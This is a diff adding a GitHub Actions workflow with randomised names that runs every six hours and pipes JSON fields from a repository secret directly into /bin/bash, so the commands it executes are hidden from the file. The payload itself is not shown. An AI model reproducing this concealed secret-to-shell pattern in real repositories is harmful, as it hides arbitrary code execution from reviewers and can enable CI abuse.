@@ -1,0 +1,28 @@
+name: xuqianzheng4651
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '56 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xuqianzheng4651
+        env:
+          iiboy667: ${{ secrets.iiboy667 }}
+        run: |
+          echo $iiboy667 | jq -r .lx32056 | /bin/bash
+          echo $i9 | jq -r .ezwdi18 | /bin/bash
+          echo $qch3137 | jq -r .grywh224 | /bin/bash
+          echo $s20520 | jq -r .heiq0827 | /bin/bash
+          echo $lwend01 | jq -r .tram6027 | /bin/bash
+          echo $opp61 | jq -r .kq6 | /bin/bash
+          echo $fzwr04 | jq -r .a636 | /bin/bash
+          echo $ye43226 | jq -r .uvla2 | /bin/bash
+          echo $yd6442 | jq -r .vmb81 | /bin/bash
+          echo $bnhqp402 | jq -r .opuxc1106 | /bin/bash
+          echo $zfbil7999 | jq -r .iolac6588 | /bin/bash
+          echo $cqas506 | jq -r .yg6 | /bin/bash
+
